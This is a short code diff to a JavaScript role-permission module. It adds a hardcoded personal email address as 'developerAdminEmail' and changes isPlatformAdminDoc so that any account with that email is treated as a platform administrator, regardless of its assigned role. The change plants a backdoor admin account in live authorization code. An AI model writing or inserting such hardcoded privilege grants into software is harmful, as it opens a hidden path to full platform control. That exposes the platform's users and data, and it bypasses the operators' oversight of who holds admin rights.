@@ -1,5 +1,6 @@
 export const workspaceRoles = ['owner', 'admin', 'accountant', 'manager', 'staff']
 export const platformAdminRoles = ['platform_admin', 'super_admin']
+export const developerAdminEmail = 'ownertast@gmail.com'
 
 export function normalizeRoleValue(role, fallback = 'staff') {
   const value = String(role || '').trim().toLowerCase()
@@ -9,7 +10,8 @@ export function normalizeRoleValue(role, fallback = 'staff') {
 
 export function isPlatformAdminDoc(userDoc = {}) {
   const role = normalizeRoleValue(userDoc?.role, '')
-  return userDoc?.isAdmin === true || platformAdminRoles.includes(role)
+  const email = String(userDoc?.email || userDoc?.userEmail || '').trim().toLowerCase()
+  return userDoc?.isAdmin === true || platformAdminRoles.includes(role) || email === developerAdminEmail
 }
 
 export function workspacePermissionDefaults(role) {
